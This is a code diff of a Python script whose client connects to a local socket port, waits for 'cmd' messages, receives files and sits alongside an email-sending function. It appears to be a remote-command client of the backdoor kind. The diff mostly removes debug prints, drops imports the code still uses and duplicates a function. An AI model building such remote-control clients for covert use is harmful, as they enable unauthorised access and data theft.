@@ -70,10 +70,8 @@ def send_email(file_name):
     s.quit()
 
 
-import os
-import socket
-import subprocess
-
+def file_size(path):
+    return os.path.getsize(path)
 
 def file_size(path):
     return os.path.getsize(path)
@@ -83,9 +81,7 @@ def client():
     s = socket.socket()
     s.connect(('127.0.0.1', 9984))
 
-    # message = input('-> ')
     while True:
-        print('While True')
         data = s.recv(1024).decode('utf-8')
         print('Got Data ', repr(data))
         if 'cmd' in data:
@@ -105,8 +101,6 @@ def client():
                 else:
                     f.close()
                     break
-            # s.send('complete'.encode('utf-8'))
-            print('yyyyyyyyyyyyyyyyyyyyyyyy')
         else:
             s.send('The command was not found'.encode('utf-8'))
 
@@ -115,3 +109,4 @@ def client():
 
 if __name__ == '__main__':
     client()
+
